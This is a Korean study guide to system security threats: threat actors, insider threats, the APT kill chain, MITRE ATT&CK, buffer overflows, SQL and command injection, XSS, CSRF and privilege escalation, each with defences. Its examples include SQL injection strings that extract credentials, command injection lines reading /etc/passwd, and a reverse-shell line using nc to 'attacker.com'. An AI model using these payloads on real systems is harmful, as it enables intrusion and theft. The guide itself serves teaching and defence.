# 시스템 보안위협 및 공격기법

시스템 보안위협은 정보 시스템의 기밀성, 무결성, 가용성을 위협하는 모든 요소를 의미합니다. 이러한 위협을 이해하고 대응하는 것이 정보보안의 핵심입니다.

---

## 보안위협 개요

### 위협의 분류

| 분류 | 설명 | 예시 |
|------|------|------|
| 자연적 위협 | 자연재해로 인한 위협 | 지진, 홍수, 화재, 낙뢰 |
| 인적 위협 (의도적) | 악의적 목적의 공격 | 해킹, 악성코드, 내부자 공격 |
| 인적 위협 (비의도적) | 실수, 부주의 | 설정 오류, 데이터 삭제 |
| 기술적 위협 | 시스템 결함 | 소프트웨어 버그, 하드웨어 고장 |

### 위협 주체 (Threat Actor)

| 주체 | 동기 | 특징 |
|------|------|------|
| 스크립트 키디 | 호기심, 자기 과시 | 낮은 기술력, 공개 도구 사용 |
| 핵티비스트 | 정치적, 사회적 목적 | Anonymous, 웹사이트 변조, DDoS |
| 사이버 범죄자 | 금전적 이익 | 랜섬웨어, 피싱, 카드 정보 탈취 |
| 내부자 | 불만, 금전적 이익 | 데이터 유출, 시스템 파괴 |
| 국가 지원 해커 (APT) | 정치적, 경제적 이익 | 고급 기술, 장기간 은밀 활동 |
| 산업 스파이 | 경쟁 우위 | 기업 기밀 탈취 |

## 관리적 보안위협

### 보안 설정 미흡

| 위협 | 설명 | 대책 |
|------|------|------|
| 기본 계정/패스워드 | 초기 설정 미변경 | 설치 후 즉시 변경 |
| 불필요한 서비스 | 사용하지 않는 서비스 활성화 | 서비스 최소화 |
| 과도한 권한 | 최소 권한 원칙 위반 | RBAC 적용 |
| 미흡한 접근 제어 | 접근 통제 부재 | ACL, 방화벽 설정 |
| 패치 미적용 | 보안 업데이트 미설치 | 정기적 패치 관리 |
| 암호화 미적용 | 평문 저장/전송 | TLS, 디스크 암호화 |
| 로깅 미설정 | 감사 로그 부재 | 감사 정책 활성화 |

### 권한 설정 취약점

| 취약점 | 설명 | 위험 |
|--------|------|------|
| 모든 사용자 쓰기 권한 | 파일/폴더에 과도한 권한 | 악성코드 설치, 데이터 변조 |
| SetUID/SetGID 악용 | 권한 상승에 악용 | root 권한 획득 |
| sudo 설정 오류 | NOPASSWD, 과도한 명령 허용 | 권한 남용 |
| 공유 폴더 권한 | Everyone 전체 권한 | 정보 유출, 랜섬웨어 확산 |

### 내부자 위협

**내부자 위협 유형**

| 유형 | 설명 |
|------|------|
| 악의적 내부자 | 의도적으로 데이터 유출, 시스템 파괴 |
| 부주의한 내부자 | 피싱에 속거나 실수로 정보 유출 |
| 침해된 내부자 | 계정 탈취되어 공격자에게 악용 |

**내부자 위협 지표**

| 지표 | 설명 |
|------|------|
| 비정상적 접근 시간 | 근무 외 시간 시스템 접근 |
| 대량 데이터 접근 | 평소와 다른 대량 조회/다운로드 |
| 권한 외 접근 시도 | 허용되지 않은 시스템 접근 시도 |
| 우회 행위 | 보안 통제 우회 시도 |
| 퇴사 예정자 활동 | 퇴사 전 대량 데이터 복사 |

**대책**
- DLP (Data Loss Prevention)
- UEBA (User and Entity Behavior Analytics)
- 최소 권한 원칙
- 직무 분리 (Separation of Duties)
- 접근 로그 모니터링

## 기술적 보안위협

### 취약점 (Vulnerability)

#### 취약점 분류

**CVE (Common Vulnerabilities and Exposures)**
- 공개된 취약점 식별자
- 형식: CVE-연도-번호 (예: CVE-2021-44228)

**CVSS (Common Vulnerability Scoring System)**

| 점수 | 심각도 |
|------|--------|
| 0.0 | None |
| 0.1 - 3.9 | Low |
| 4.0 - 6.9 | Medium |
| 7.0 - 8.9 | High |
| 9.0 - 10.0 | Critical |

**CWE (Common Weakness Enumeration)**
- 소프트웨어 취약점 유형 분류
- 예: CWE-89 (SQL Injection), CWE-79 (XSS)

## 시스템 공격기법

### APT (Advanced Persistent Threat)

고도화되고 지속적인 표적 공격입니다.

#### APT 특징

| 특징 | 설명 |
|------|------|
| Advanced | 고급 기술, 제로데이 취약점 사용 |
| Persistent | 장기간 은밀하게 활동 |
| Threat | 특정 목표를 대상으로 한 위협 |

#### APT 공격 단계 (Cyber Kill Chain)

| 단계 | 설명 | 활동 |
|------|------|------|
| 1. 정찰 (Reconnaissance) | 대상 정보 수집 | OSINT, 포트 스캔 |
| 2. 무기화 (Weaponization) | 공격 도구 제작 | 익스플로잇 + 페이로드 |
| 3. 전달 (Delivery) | 악성코드 전달 | 피싱, 워터링 홀 |
| 4. 취약점 공격 (Exploitation) | 취약점 이용 침투 | 익스플로잇 실행 |
| 5. 설치 (Installation) | 지속성 확보 | 백도어, 루트킷 |
| 6. 명령 및 제어 (C2) | 원격 제어 | C2 서버 통신 |
| 7. 목표 달성 (Actions) | 최종 목적 수행 | 데이터 유출, 파괴 |

#### MITRE ATT&CK 프레임워크

| 전술 (Tactics) | 설명 |
|---------------|------|
| Initial Access | 초기 침투 |
| Execution | 악성코드 실행 |
| Persistence | 지속성 확보 |
| Privilege Escalation | 권한 상승 |
| Defense Evasion | 탐지 회피 |
| Credential Access | 자격증명 획득 |
| Discovery | 환경 탐색 |
| Lateral Movement | 측면 이동 |
| Collection | 데이터 수집 |
| Command and Control | 명령 및 제어 |
| Exfiltration | 데이터 유출 |
| Impact | 시스템 영향 |

#### 주요 APT 그룹

| 그룹 | 추정 국가 | 주요 대상 |
|------|----------|----------|
| APT28 (Fancy Bear) | 러시아 | 정부, 군사 |
| APT29 (Cozy Bear) | 러시아 | 정부, 싱크탱크 |
| APT41 | 중국 | 다양한 산업 |
| Lazarus | 북한 | 금융, 암호화폐 |
| APT33 | 이란 | 에너지, 항공 |

### 버퍼 오버플로우 (Buffer Overflow)

버퍼 경계를 초과하여 데이터를 쓰는 취약점입니다.

#### 버퍼 오버플로우 유형

| 유형 | 설명 |
|------|------|
| 스택 버퍼 오버플로우 | 스택 영역 버퍼 초과 |
| 힙 버퍼 오버플로우 | 힙 영역 버퍼 초과 |
| 정수 오버플로우 | 정수 범위 초과로 버퍼 크기 오류 |
| 포맷 스트링 | printf 등 포맷 문자열 악용 |

#### 공격 기법

**스택 기반 공격**
1. 버퍼에 쉘코드 삽입
2. 리턴 주소를 쉘코드 주소로 덮어씀
3. 함수 리턴 시 쉘코드 실행

**Return-to-libc**
- DEP 우회 기법
- 시스템 라이브러리 함수 호출

**ROP (Return-Oriented Programming)**
- 코드 조각(Gadget)을 체인으로 연결
- DEP, ASLR 우회

#### 방어 기법

| 기법 | 설명 |
|------|------|
| Stack Canary | 스택에 랜덤 값 삽입, 변조 탐지 |
| DEP/NX | 데이터 영역 실행 금지 |
| ASLR | 주소 공간 무작위화 |
| PIE | 위치 독립 실행 |
| CFI | 제어 흐름 무결성 |
| Safe Functions | strcpy → strncpy, sprintf → snprintf |

### SQL Injection

데이터베이스 쿼리를 조작하는 공격입니다.

#### SQL Injection 유형

| 유형 | 설명 |
|------|------|
| In-band | 같은 채널로 결과 확인 |
| Error-based | 에러 메시지로 정보 추출 |
| Union-based | UNION으로 데이터 추출 |
| Blind | 참/거짓 응답으로 유추 |
| Boolean-based | 조건문 참/거짓 |
| Time-based | 응답 시간 차이 |
| Out-of-band | 다른 채널로 데이터 전송 |

#### 공격 예시

```sql
-- 인증 우회
SELECT * FROM users WHERE id='admin' OR '1'='1'--' AND pw='...'

-- 데이터 추출
SELECT * FROM products WHERE id=1 UNION SELECT username,password,3 FROM users--

-- 테이블 정보 추출 (MySQL)
UNION SELECT table_name,2,3 FROM information_schema.tables--

-- 시간 기반 Blind
SELECT * FROM users WHERE id=1 AND SLEEP(5)--
```

#### 방어 대책

| 대책 | 설명 |
|------|------|
| Prepared Statement | 파라미터화된 쿼리 |
| Stored Procedure | 사전 정의된 프로시저 |
| 입력값 검증 | 화이트리스트, 타입 검증 |
| 이스케이프 | 특수문자 처리 |
| 최소 권한 | DB 계정 권한 제한 |
| 에러 숨김 | 상세 에러 메시지 숨김 |
| WAF | SQL Injection 패턴 탐지 |

### 명령어 삽입 (Command Injection)

운영체제 명령어를 실행하는 공격입니다.

#### 공격 예시

```bash
# 정상 입력
ping 192.168.1.1

# 악성 입력
ping 192.168.1.1; cat /etc/passwd
ping 192.168.1.1 && whoami
ping 192.168.1.1 | nc attacker.com 4444 -e /bin/bash
```

**명령어 구분자**

| 구분자 | 설명 |
|--------|------|
| ; | 순차 실행 |
| && | 앞 명령 성공 시 실행 |
| \|\| | 앞 명령 실패 시 실행 |
| \| | 파이프 |
| \`cmd\` | 명령어 치환 |
| $(cmd) | 명령어 치환 |
| > | 출력 리다이렉션 |

#### 방어 대책

| 대책 | 설명 |
|------|------|
| 입력값 검증 | 화이트리스트 |
| 이스케이프 | 특수문자 처리 |
| 파라미터화 | 인자로 전달 |
| 대체 API | 시스템 명령 대신 라이브러리 사용 |
| 최소 권한 | 애플리케이션 실행 권한 제한 |

### XSS (Cross-Site Scripting)

클라이언트 측에서 악성 스크립트를 실행하는 공격입니다.

#### XSS 유형

| 유형 | 저장 위치 | 설명 |
|------|----------|------|
| Stored XSS | 서버 DB | 게시판 등에 저장 후 실행 |
| Reflected XSS | URL 파라미터 | 요청에 포함된 스크립트 반사 |
| DOM-based XSS | 클라이언트 | DOM 조작으로 스크립트 삽입 |

#### 공격 예시

```html
<!-- 기본 -->
<script>alert('XSS')</script>

<!-- 이벤트 핸들러 -->
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">

<!-- 쿠키 탈취 -->
```

### CSRF (Cross-Site Request Forgery)

사용자의 인증된 세션을 악용하여 의도하지 않은 요청을 전송합니다.

#### 공격 예시

```html
<!-- 이미지 태그 악용 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000">

<!-- 폼 자동 제출 -->
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

#### 방어 대책

| 대책 | 설명 |
|------|------|
| CSRF 토큰 | 요청마다 고유 토큰 검증 |
| SameSite Cookie | 쿠키 전송 제한 |
| Referer 검증 | 요청 출처 확인 |
| 재인증 | 중요 작업 시 재인증 |

### 권한 상승 (Privilege Escalation)

#### 권한 상승 유형

| 유형 | 설명 |
|------|------|
| 수직적 권한 상승 | 낮은 권한 → 높은 권한 (user → root) |
| 수평적 권한 상승 | 동급 다른 사용자 권한 획득 |

#### Linux 권한 상승 기법

| 기법 | 설명 |
|------|------|
| SUID 바이너리 | root 소유 SUID 프로그램 악용 |
| sudo 설정 오류 | NOPASSWD, 위험 명령 허용 |
| 커널 취약점 | Dirty COW 등 커널 익스플로잇 |
| 크론 작업 | root 권한 크론 작업 조작 |
| 서비스 설정 | 서비스 바이너리/설정 파일 쓰기 권한 |
| PATH 하이재킹 | PATH에서 악성 바이너리 먼저 실행 |
| LD_PRELOAD | 라이브러리 프리로드 악용 |

#### Windows 권한 상승 기법

| 기법 | 설명 |
|------|------|
| Unquoted Service Path | 공백 있는 경로 악용 |
| DLL Hijacking | DLL 검색 순서 악용 |
| AlwaysInstallElevated | MSI 관리자 권한 설치 |
| 토큰 조작 | 액세스 토큰 탈취/복제 |
| UAC 우회 | UAC 우회 기법 |
| 취약한 서비스 권한 | 서비스 바이너리 수정 |
| 저장된 자격증명 | 저장된 패스워드 추출 |

### 측면 이동 (Lateral Movement)

침투 후 내부 네트워크에서 다른 시스템으로 이동합니다.

| 기법 | 설명 |
|------|------|
| Pass-the-Hash | NTLM 해시로 인증 |
| Pass-the-Ticket | Kerberos 티켓으로 인증 |
| PsExec | 원격 명령 실행 |
| WMI | Windows 관리 도구 악용 |
| RDP | 원격 데스크톱 접속 |
| SSH | SSH 키 또는 자격증명 악용 |
| SMB 공유 | 네트워크 공유 악용 |
